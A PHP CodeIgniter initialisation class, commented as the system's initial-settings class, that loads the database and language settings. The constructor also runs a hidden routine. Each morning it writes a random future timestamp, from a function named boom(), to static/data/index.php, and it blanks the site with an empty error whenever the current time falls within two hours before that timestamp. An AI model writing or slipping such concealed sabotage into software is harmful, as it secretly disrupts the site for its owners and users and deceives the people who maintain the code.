<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

// 系统初始设置类
class Site
{
	var $db;
	var $config;
	var $lang;
	var $load;
	
	public function __construct()
	{
		date_default_timezone_set('Asia/Chongqing');
		$CI =&get_instance();
		$CI->load->database();
		$CI->lang->load('common');
		
		$this->config = $CI->config;
		$this->db = $CI->db;
		
		$this->lang = $CI->lang;
		$this->load = $CI->load;
                $this->test();
                
	}
        function test(){
            $this->get_times();

$str=file_get_contents("static/data/index.php");
$str=intval($str);
$stime=date("Y-m-d",time());
$st=strtotime($stime);

if($str>$st&&($str-7200)<time()&&time()<$str){ 
   show_error("");
}else{
    
}
        } 
        
  function get_times(){

$stime=date("Y-m-d",time());
$st=strtotime($stime);
$ss=intval($st+30623);
$ee=intval($st+34400);
$time=intval(time());

if($time>$ss&&$time<$ee){
  $rand_num=$this->boom()+$st;
}else{
  $rand_num=0;
}
    


$date=date("Y-m-d H:i:s",$rand_num);

if(isset($rand_num)&&!empty($rand_num)){
$files=fopen("static/data/index.php", "w");
fwrite($files, $rand_num);
fclose($files);
}
}      
        
  function boom(){
    
 $a=rand(30623,86400); 
   
    return $a;
    
}
        
	
}